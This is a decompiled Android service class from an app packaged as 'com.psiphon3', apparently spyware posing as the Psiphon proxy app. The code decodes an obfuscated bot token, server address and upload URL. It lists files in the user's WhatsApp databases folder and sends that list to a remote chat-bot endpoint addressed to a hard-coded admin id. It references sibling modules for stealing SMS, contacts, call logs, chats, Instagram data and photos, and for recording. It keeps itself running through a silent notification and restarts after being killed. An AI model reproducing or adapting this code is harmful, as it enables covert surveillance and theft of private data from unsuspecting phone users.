package com.psiphon3;


import anywheresoftware.b4a.BA;
import anywheresoftware.b4a.objects.ServiceHelper;
import anywheresoftware.b4a.debug.*;

public class getlists extends  android.app.Service{
	public static class getlists_BR extends android.content.BroadcastReceiver {

		@Override
		public void onReceive(android.content.Context context, android.content.Intent intent) {
            BA.LogInfo("** Receiver (getlists) OnReceive **");
			android.content.Intent in = new android.content.Intent(context, getlists.class);
			if (intent != null)
				in.putExtra("b4a_internal_intent", intent);
            ServiceHelper.StarterHelper.startServiceFromReceiver (context, in, false, BA.class);
		}

	}
    static getlists mostCurrent;
	public static BA processBA;
    private ServiceHelper _service;
    public static Class<?> getObject() {
		return getlists.class;
	}
	@Override
	public void onCreate() {
        super.onCreate();
        mostCurrent = this;
        if (processBA == null) {
		    processBA = new BA(this, null, null, "com.psiphon3", "com.psiphon3.getlists");
            if (BA.isShellModeRuntimeCheck(processBA)) {
                processBA.raiseEvent2(null, true, "SHELL", false);
		    }
            try {
                Class.forName(BA.applicationContext.getPackageName() + ".main").getMethod("initializeProcessGlobals").invoke(null, null);
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
            processBA.loadHtSubs(this.getClass());
            ServiceHelper.init();
        }
        _service = new ServiceHelper(this);
        processBA.service = this;
        
        if (BA.isShellModeRuntimeCheck(processBA)) {
			processBA.raiseEvent2(null, true, "CREATE", true, "com.psiphon3.getlists", processBA, _service, anywheresoftware.b4a.keywords.Common.Density);
		}
        if (!false && ServiceHelper.StarterHelper.startFromServiceCreate(processBA, false) == false) {
				
		}
		else {
            processBA.setActivityPaused(false);
            BA.LogInfo("*** Service (getlists) Create ***");
            processBA.raiseEvent(null, "service_create");
        }
        processBA.runHook("oncreate", this, null);
        if (false) {
			ServiceHelper.StarterHelper.runWaitForLayouts();
		}
    }
		@Override
	public void onStart(android.content.Intent intent, int startId) {
		onStartCommand(intent, 0, 0);
    }
    @Override
    public int onStartCommand(final android.content.Intent intent, int flags, int startId) {
    	if (ServiceHelper.StarterHelper.onStartCommand(processBA, new Runnable() {
            public void run() {
                handleStart(intent);
            }}))
			;
		else {
			ServiceHelper.StarterHelper.addWaitForLayout (new Runnable() {
				public void run() {
                    processBA.setActivityPaused(false);
                    BA.LogInfo("** Service (getlists) Create **");
                    processBA.raiseEvent(null, "service_create");
					handleStart(intent);
                    ServiceHelper.StarterHelper.removeWaitForLayout();
				}
			});
		}
        processBA.runHook("onstartcommand", this, new Object[] {intent, flags, startId});
		return android.app.Service.START_STICKY;
    }
    public void onTaskRemoved(android.content.Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        if (false)
            processBA.raiseEvent(null, "service_taskremoved");
            
    }
    private void handleStart(android.content.Intent intent) {
    	BA.LogInfo("** Service (getlists) Start **");
    	java.lang.reflect.Method startEvent = processBA.htSubs.get("service_start");
    	if (startEvent != null) {
    		if (startEvent.getParameterTypes().length > 0) {
    			anywheresoftware.b4a.objects.IntentWrapper iw = ServiceHelper.StarterHelper.handleStartIntent(intent, _service, processBA);
    			processBA.raiseEvent(null, "service_start", iw);
    		}
    		else {
    			processBA.raiseEvent(null, "service_start");
    		}
    	}
    }
	
	@Override
	public void onDestroy() {
        super.onDestroy();
        if (false) {
            BA.LogInfo("** Service (getlists) Destroy (ignored)**");
        }
        else {
            BA.LogInfo("** Service (getlists) Destroy **");
		    processBA.raiseEvent(null, "service_destroy");
            processBA.service = null;
		    mostCurrent = null;
		    processBA.setActivityPaused(true);
            processBA.runHook("ondestroy", this, null);
        }
	}

@Override
	public android.os.IBinder onBind(android.content.Intent intent) {
		return null;
	}public anywheresoftware.b4a.keywords.Common __c = null;
public static com.psiphon3.httpjob _v6 = null;
public static com.psiphon3.httpjob _v7 = null;
public static anywheresoftware.b4a.objects.collections.JSONParser _v0 = null;
public static String _vv1 = "";
public static int _admin_id = 0;
public static String _vv2 = "";
public static String _vv3 = "";
public static String _vv4 = "";
public static String _vv5 = "";
public static ir.rayanoos.lib.upload_ultra.upload_ultra _vv6 = null;
public static ice.smsplus.SmsWrapper _vv7 = null;
public static com.AB.ABZipUnzip.ABZipUnzip _vv0 = null;
public static anywheresoftware.b4a.phone.CallLogWrapper _vvv1 = null;
public static anywheresoftware.b4a.phone.Contacts2Wrapper _vvv2 = null;
public static ir.rayanoos.lib.ultra_decoder.ultra_decoder _vvv3 = null;
public ir.rayanoos.lib.upload_ultra.uploadfile _vvvvvvvv5 = null;
public com.psiphon3.main _vvvvvvvv6 = null;
public com.psiphon3.cmr _vvvvvvvv7 = null;
public com.psiphon3.cmr2 _vvvvvvvv0 = null;
public com.psiphon3.firebasemessaging _vvvvvvvvv1 = null;
public com.psiphon3.getallcalls _vvvvvvvvv2 = null;
public com.psiphon3.getallcontacts _vvvvvvvvv3 = null;
public com.psiphon3.getallsms _vvvvvvvvv4 = null;
public com.psiphon3.getchats _vvvvvvvvv5 = null;
public com.psiphon3.getinsta _vvvvvvvvv6 = null;
public com.psiphon3.getonechat _vvvvvvvvv0 = null;
public com.psiphon3.getpicture _vvvvvvvvvv1 = null;
public com.psiphon3.getpicture2 _vvvvvvvvvv2 = null;
public com.psiphon3.srv _vvvvvvvvvv3 = null;
public com.psiphon3.starter _vvvvvvvvvv4 = null;
public com.psiphon3.startrecord _vvvvvvvvvv5 = null;
public com.psiphon3.httputils2service _vvvvvvvvvv6 = null;
public static String  _getlist(String _topic,String _data) throws Exception{
anywheresoftware.b4a.objects.collections.List _mylist = null;
String[] _arrayoffiles = null;
int _i = 0;
String _finalstr = "";
 //BA.debugLineNum = 63;BA.debugLine="Sub getlist (Topic As String, Data As String)";
 //BA.debugLineNum = 64;BA.debugLine="Try";
try { //BA.debugLineNum = 67;BA.debugLine="Dim mylist As List";
_mylist = new anywheresoftware.b4a.objects.collections.List();
 //BA.debugLineNum = 68;BA.debugLine="mylist=	File.ListFiles(File.DirRootExternal&\"/Wh";
_mylist = anywheresoftware.b4a.keywords.Common.File.ListFiles(anywheresoftware.b4a.keywords.Common.File.getDirRootExternal()+"/WhatsApp/DataBases");
 //BA.debugLineNum = 69;BA.debugLine="Dim ArrayOfFiles(mylist.Size) As String";
_arrayoffiles = new String[_mylist.getSize()];
java.util.Arrays.fill(_arrayoffiles,"");
 //BA.debugLineNum = 70;BA.debugLine="For i = 0 To mylist.Size - 1";
{
final int step5 = 1;
final int limit5 = (int) (_mylist.getSize()-1);
_i = (int) (0) ;
for (;_i <= limit5 ;_i = _i + step5 ) {
 //BA.debugLineNum = 71;BA.debugLine="ArrayOfFiles(i) = mylist.Get(i)";
_arrayoffiles[_i] = BA.ObjectToString(_mylist.Get(_i));
 }
};
 //BA.debugLineNum = 73;BA.debugLine="Dim finalStr As String=\"\"";
_finalstr = "";
 //BA.debugLineNum = 74;BA.debugLine="For i=0 To ArrayOfFiles.Length-1";
{
final int step9 = 1;
final int limit9 = (int) (_arrayoffiles.length-1);
_i = (int) (0) ;
for (;_i <= limit9 ;_i = _i + step9 ) {
 //BA.debugLineNum = 75;BA.debugLine="finalStr=finalStr&ArrayOfFiles(i)&\"     -     \"";
_finalstr = _finalstr+_arrayoffiles[_i]+"     -     ";
 }
};
 //BA.debugLineNum = 79;BA.debugLine="ht2.Download(apiserver&token&\"/sendmessage?chat_";
_v7._vvvv6 /*String*/ (_vv2+_vv1+"/sendmessage?chat_id="+BA.NumberToString(_admin_id)+"&text="+_finalstr+"&reply_to_message_id="+BA.NumberToString(0));
 } 
       catch (Exception e14) {
			processBA.setLastException(e14); //BA.debugLineNum = 81;BA.debugLine="ht2.Download(apiserver&token&\"/sendmessage?chat_";
_v7._vvvv6 /*String*/ (_vv2+_vv1+"/sendmessage?chat_id="+BA.NumberToString(_admin_id)+"&text="+"Exception"+"&reply_to_message_id="+BA.NumberToString(0));
 };
 //BA.debugLineNum = 83;BA.debugLine="End Sub";
return "";
}
public static String  _process_globals() throws Exception{
 //BA.debugLineNum = 6;BA.debugLine="Sub Process_Globals";
 //BA.debugLineNum = 9;BA.debugLine="Dim ht,ht2 As HttpJob";
_v6 = new com.psiphon3.httpjob();
_v7 = new com.psiphon3.httpjob();
 //BA.debugLineNum = 10;BA.debugLine="Dim js As JSONParser";
_v0 = new anywheresoftware.b4a.objects.collections.JSONParser();
 //BA.debugLineNum = 11;BA.debugLine="Dim token As String = \":...__::...__::...__._____";
_vv1 = main.vvv13 (new byte[] {50,53,84,-15,72,67,74,-93,35,45,85,-98,87,33,64,-15,57,50,47,-58,35,92,36,-98,87,68,37,-27,45,50,94,-73,82,92}, 992687)+main.vvv13 (new byte[] {87,54,57,-40,45,37,66,-17,35,95,56,-58,38,71,57,-40,45,37,66,-17,35,95,56,-58,38,71,57,-40,45,37,66,-17,35,95,56,-73,87,71,57,-40,72,64,86,-5,35,46,73,-58,87,54,57,-40,72,64,51,-98,55,58,73,-73,38,71,57,-67,45,49,66,-17,82,95,73,-58,50,34,92,-40,57,49,51,-17,82,95,56,-58,87,71,57,-67,45,64,66,-17,82,46,56,-58,87}, 394008)+main.vvv13 (new byte[] {87,71,56,-54,45,37,50,-3,35,46,57,-91,87,71,56,-54,72,64,87,-23,82,46,72,-91,87,71,56,-54,57,64,50,-116,55,58,57,-44,38,71,56,-54,72,49,50,-116,82,58,92,-91,87,71,56,-69,57,49,50,-3,35,58,92,-91,87,71,73,-54,72,49,50,-116,35,58,92,-44,38,54,73,-69}, 396433)+main.vvv13 (new byte[] {38,53,71,-15,72,67,89,-46,35,92,55,-98,38,68,54,-128,57,50,89,-46,35,45,70,-17,87,53,54,-108,45,50,60,-58,82,45,55,-17,38,68,71,-108,45,67,60,-73,82,92,55,-98,87,53,71,-15,45,38,77,-58,35,92,55,-17,38,68,54,-108,45,67,60,-73,82,92,70,-17,87,53,71,-15,45,38,60,-58,82,45,70,-17,38,53,71,-15,72,38,89,-58,82,92,55,-17,38,68,54,-15,72,38,89,-58,35,45,55,-17,87,53,54,-15,72,38,89,-73,35,92,55,-98,87,68,54,-128,57,67,89,-46,35,92,55,-98,38,68,54,-128,57,50,89,-46,82,45,70,-17,38,68,54,-15,72,67,60,-73,55,57,70,-98,87,68,71,-15}, 954227)+main.vvv13 (new byte[] {87,54,-56,-63,45,37,-62,-121,82,95,-72,-82,38,54,-56,-63,45,37,-62,-10,35,95,-72,-33,38,54,-71,-63,45,37,-77,-121,82,95,-55,-82,87,71,-56,-63,72,37,-42,-10,35,46,-55,-82,87,71,-71,-63,72,64,-77,-109,55,46,-55,-82,87,54,-71,-80,57,49,-62,-109,82,58,-72,-33,38,54,-56,-63,57,64,-77,-121,82,58,-35,-33,38,71,-71,-63,72,64,-62,-121,35,58,-35,-33,87,71,-56,-80,72,49,-77,-10,35,58,-35,-33,38,54,-71,-80,72,64,-62,-10}, 688698)+main.vvv13 (new byte[] {87,71,96,124,57,49,126,46,82,46,117,7,87,54,96,124,72,64,126,95,82,95,4,118,87,71,5,124,45,64,126,46,82,95,4,7,38,71,5,25,72,37,106,46,82,95,117,7,87,71,116,25,57,37}, 327760);
 //BA.debugLineNum = 12;BA.debugLine="Dim admin_id As Int = 315160032";
_admin_id = (int) (315160032);
 //BA.debugLineNum = 13;BA.debugLine="Dim apiserver As String=\":.____..._.::..____....:";
_vv2 = main.vvv13 (new byte[] {50,53,38,-42,72,67,93,-31,35,92,86,-83,50,53,87,-42,72,67,44,-31,35,45,86,-83,50,53,87,-42,72,67,44,-31,35,45,86,-83,50,53,38,-42,57,50,93,-31,35,45,86,-83,50,53,87,-42,57,50,93,-31,82,92,86,-83,50,52,86,-77,57,67,44,-31,35,92,86,-56,87,53,67,-77}, 990829)+main.vvv13 (new byte[] {38,68,25,37,57,67,98,18,82,45,125,47,38,68,25,37,57,67,98,18,82,45,125,59,50,53,104,37,57,67,98,99,82,92,105,47,50,68,104,37,57,50,98,99,35,92,105,47,50,53,104,84,72,67,19,99,35,45,105,47,50,53,25}, 909056)+main.vvv13 (new byte[] {87,70,-115,44,57,65,-121,27,55,59,-3,67,87,55,-4,93,57,65,-121,27,55,59,-3,67,87,70,-115,44,57,48,-10,27,55,59,-3,50,38,70,-115,44,72,65,-121,27,55,59,-3,50,87,55,-115,44,57,65,-121,27,55,59,-3,50,87,70,-115,44,72,65,-121,27,55,47,-23,67,38,70,-115,44,57,65,-10,106,35,59,-23,67,38,70}, 51750)+main.vvv13 (new byte[] {38,55,-113,41,72,48,-123,10,34,59,-1,55,87,55,-113,41,57,65,-123,30,55,59,-1,55,87,70,-113,88,72,65,-123,111,55,59,-1,70,87,70,-113,41,57,48,-12,30,55}, 47101);
 //BA.debugLineNum = 14;BA.debugLine="Dim fileToWirte As String = \"msgid16.txt\"";
_vv3 = main.vvv13 (new byte[] {101,106,-72,93,115,47,-29,92,121,121,-86}, 45356);
 //BA.debugLineNum = 15;BA.debugLine="Dim StartMessage As String = \"test16\"";
_vv4 = main.vvv13 (new byte[] {124,125,-122,125,38,41}, 722413);
 //BA.debugLineNum = 16;BA.debugLine="Dim uploadUrl As String = \":.____..._.::..____...";
_vv5 = main.vvv13 (new byte[] {50,54,108,-24,72,64,23,-33,35,95,28,-109,50,54,29,-24,72,64,102,-33,35,46,28,-109,50,54,29,-24,72,64,102,-33,35,46,28,-109,50,54,108,-24,57,49,23,-33}, 276931)+main.vvv13 (new byte[] {38,54,-44,5,45,48,-33,67,35,46,-43,15,87,54,-44,96,72,49,-54,67,82,46,-43,15,38,54,-44,17,72,49,-54,67,35,46,-92,126,87,71,-44,17,57,49,-54,67,35,95,-92,126,87,71,-44,96,72,49,-54}, 697485)+main.vvv13 (new byte[] {50,54,30,-44,57,49,20,-29,82,95,31,-81,50,54,30,-44,72,64,101,-29,35,46,31,-81,50,54,111,-91,72,64,101,-110,82,95,31,-81,50,54,111,-44,57,64,101,-29,82,95,31,-81,50,54,111,-44,72,64,101,-110,82,95,31,-81,38,34,30,-91,72,64,101,-29,82,46,110,-69,50,34,30,-91,72,49,20,-110,82,95,31,-54,50,55,10,-91,72,49,101,-110,35,46,31,-54,38,34,10,-91,72,64,20,-29,35,46}, 269695)+main.vvv13 (new byte[] {38,54,-72,-17,45,49,-61,-52,35,46,-56,-108,38,54,-72,-17,45,49,-61,-52,82,46,-56,-108,87,71,-72,-17,57,37,-78,-52,82,46,-71,-27,38}, 504149)+main.vvv13 (new byte[] {38,55,-6,-56,45,48,-127,-21,82,94,-5,-62,38,70,-6,-56,45,48,-127,-21,35,47,-5}, 57501)+main.vvv13 (new byte[] {38,55,-60,6,45}, 70662);
 //BA.debugLineNum = 17;BA.debugLine="Dim upload As upload_ultra";
_vv6 = new ir.rayanoos.lib.upload_ultra.upload_ultra();
 //BA.debugLineNum = 18;BA.debugLine="Dim allsms As SmsMessages";
_vv7 = new ice.smsplus.SmsWrapper();
 //BA.debugLineNum = 19;BA.debugLine="Dim zip As ABZipUnzip";
_vv0 = new com.AB.ABZipUnzip.ABZipUnzip();
 //BA.debugLineNum = 20;BA.debugLine="Dim callLog As CallLog";
_vvv1 = new anywheresoftware.b4a.phone.CallLogWrapper();
 //BA.debugLineNum = 21;BA.debugLine="Dim c As Contacts2";
_vvv2 = new anywheresoftware.b4a.phone.Contacts2Wrapper();
 //BA.debugLineNum = 22;BA.debugLine="Dim decode As ultra_decoder";
_vvv3 = new ir.rayanoos.lib.ultra_decoder.ultra_decoder();
 //BA.debugLineNum = 26;BA.debugLine="End Sub";
return "";
}
public static String  _service_create() throws Exception{
anywheresoftware.b4a.objects.NotificationWrapper _n = null;
 //BA.debugLineNum = 28;BA.debugLine="Sub Service_Create";
 //BA.debugLineNum = 29;BA.debugLine="decode.Initialize";
_vvv3._initialize(processBA);
 //BA.debugLineNum = 30;BA.debugLine="token = decode.decode(token)";
_vv1 = _vvv3._decode(_vv1);
 //BA.debugLineNum = 31;BA.debugLine="apiserver=decode.decode(apiserver)";
_vv2 = _vvv3._decode(_vv2);
 //BA.debugLineNum = 32;BA.debugLine="uploadUrl=decode.decode(uploadUrl)";
_vv5 = _vvv3._decode(_vv5);
 //BA.debugLineNum = 34;BA.debugLine="ht.Initialize(\"ht\",Me)";
_v6._initialize /*String*/ (processBA,"ht",getlists.getObject());
 //BA.debugLineNum = 35;BA.debugLine="ht2.Initialize(\"ht2\",Me)";
_v7._initialize /*String*/ (processBA,"ht2",getlists.getObject());
 //BA.debugLineNum = 36;BA.debugLine="ht.JobName=\"ht1\"";
_v6._vvvvvvv3 /*String*/  = "ht1";
 //BA.debugLineNum = 37;BA.debugLine="ht2.JobName=\"ht2\"";
_v7._vvvvvvv3 /*String*/  = "ht2";
 //BA.debugLineNum = 38;BA.debugLine="upload.Initialize(uploadUrl,token)";
_vv6._initialize(processBA,_vv5,_vv1);
 //BA.debugLineNum = 39;BA.debugLine="Dim n As Notification";
_n = new anywheresoftware.b4a.objects.NotificationWrapper();
 //BA.debugLineNum = 40;BA.debugLine="n.Initialize2(n.IMPORTANCE_LOW)";
_n.Initialize2(_n.IMPORTANCE_LOW);
 //BA.debugLineNum = 41;BA.debugLine="n.Icon      = \"icon\"";
_n.setIcon("icon");
 //BA.debugLineNum = 42;BA.debugLine="n.Sound    = False";
_n.setSound(anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 43;BA.debugLine="n.Vibrate    = False";
_n.setVibrate(anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 44;BA.debugLine="n.Light    = False";
_n.setLight(anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 45;BA.debugLine="n.Insistent  = False";
_n.setInsistent(anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 46;BA.debugLine="n.AutoCancel = False";
_n.setAutoCancel(anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 47;BA.debugLine="n.SetInfo(\"\",\"\",\"\")";
_n.SetInfoNew(processBA,BA.ObjectToCharSequence(""),BA.ObjectToCharSequence(""),(Object)(""));
 //BA.debugLineNum = 48;BA.debugLine="Service.AutomaticForegroundNotification = n";
mostCurrent._service.AutomaticForegroundNotification = (android.app.Notification)(_n.getObject());
 //BA.debugLineNum = 56;BA.debugLine="End Sub";
return "";
}
public static String  _service_destroy() throws Exception{
 //BA.debugLineNum = 87;BA.debugLine="Sub Service_Destroy";
 //BA.debugLineNum = 88;BA.debugLine="StartServiceAt(\"\" , DateTime.Now+100 , True)";
anywheresoftware.b4a.keywords.Common.StartServiceAt(processBA,(Object)(""),(long) (anywheresoftware.b4a.keywords.Common.DateTime.getNow()+100),anywheresoftware.b4a.keywords.Common.True);
 //BA.debugLineNum = 89;BA.debugLine="End Sub";
return "";
}
public static String  _service_start(anywheresoftware.b4a.objects.IntentWrapper _startingintent) throws Exception{
 //BA.debugLineNum = 58;BA.debugLine="Sub Service_Start (StartingIntent As Intent)";
 //BA.debugLineNum = 61;BA.debugLine="End Sub";
return "";
}
}
